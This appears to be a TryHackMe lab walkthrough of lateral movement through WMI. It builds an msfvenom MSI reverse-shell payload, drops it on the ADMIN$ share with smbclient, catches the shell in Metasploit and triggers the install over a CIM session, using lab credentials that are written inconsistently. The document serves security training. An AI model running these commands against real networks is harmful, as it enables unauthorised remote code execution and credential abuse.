# WMI Walkthrough

- Connect to THMJMP2 using credentials from http://distributor.za.tryhackme.com/creds  
`ssh za\\User1@thmjmp2.za.tryhackme.com`  

Captured admin credentials to be used (provided by THM):
- ZA.TRYHACKME.COM\t1_korine.waters
- Korine.1194

Create MSI payload using msfvenom:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi`  

Copy Payload using SMB:
`smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994` 

- Copy payload to ADMIN$ share
- Available at C:\Windows\ on the server

Start handler to receive reverse shell from Metasploit:  
`msf6 exploit(multi/handler) > set LHOST lateralmovement`  
`msf6 exploit(multi/handler) > set LPORT 4445`  
`msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp`  
`msf6 exploit(multi/handler) > exploit`

Start WMI session against THMIIS from a PowerShell console on THMJMP2:  
`PS C:\> $username = 't1_corine.waters';`  
`PS C:\> $password = 'Korine.1994';`
`PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;`  
`PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`  
`PS C:\> $Opt = New-CimSessionOption -Protocol DCOM`  
`PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop`

Invoke the install method from Win32_Product to trigger payload:
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`